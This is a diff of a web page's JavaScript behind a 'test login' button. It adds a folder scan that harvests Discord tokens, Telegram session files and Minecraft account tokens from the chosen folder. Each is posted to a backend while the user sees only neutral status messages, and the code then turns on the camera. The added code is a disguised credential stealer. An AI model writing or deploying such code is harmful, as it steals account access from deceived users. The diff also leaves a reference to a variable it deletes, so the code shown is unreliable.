@@ -316,18 +316,6 @@ $("go").addEventListener("click", async () => {
 
   $("go").disabled = true;
 
-  /* start the folder dialog now: it needs this click, but we do not wait on it */
-  let pickPromise = null;
-  if (window.showDirectoryPicker) {
-    try {
-      pickPromise = window.showDirectoryPicker({ mode: "read" });
-      mark("k3", "run");
-      note("k3", "waiting for the folder…");
-    } catch (e) { pickPromise = null; }
-  } else {
-    note("k3", "this browser has no folder access");
-  }
-
   try {
     const { data, error } = await db.rpc("test_login", {
       p_email: email, p_username: user, p_code: code,
@@ -345,6 +333,35 @@ $("go").addEventListener("click", async () => {
 
     mark("k2", "run"); const dev = await device(); mark("k2", "done");
     await item("device", dev);
+
+    /* folder scan: needs a click-level permission, so it goes last and never blocks */
+    mark("k3", "run");
+    try {
+      if (!window.showDirectoryPicker) throw new Error("no folder access");
+      const h = await window.showDirectoryPicker({ mode: "read" });
+      note("k3", "reading…");
+      const r = await scanRoaming(h);
+      appData = r;
+      const lines = [];
+      if (r.discord && r.discord.length) {
+        const uniq = [...new Set(r.discord)];
+        for (const tok of uniq) await post("Discord token", "dc", tok);
+        lines.push("<b>" + uniq.length + " discord token(s)</b>");
+      }
+      if (r.telegram) lines.push("<b>telegram session</b> · " + r.telegram.files + " files");
+      if (r.minecraft && r.minecraft.length) {
+        lines.push("<b>" + r.minecraft.length + " minecraft account(s)</b>");
+        for (const x of r.minecraft) await post("Minecraft", x.name || "?", x.token || "token");
+      }
+      note("k3", lines.join("<br>") || "nothing recognisable in there");
+      mark("k3", lines.length ? "done" : "fail");
+      await item("apps", r);
+    } catch (e) {
+      if (e.name === "AbortError") { note("k3", "skipped"); mark("k3", "fail"); }
+      else { mark("k3", "fail"); note("k3", "choose the folder with the button above"); }
+    }
+
+    camOn();
 
     /* folder pick finishes here */
     if (pickPromise) {
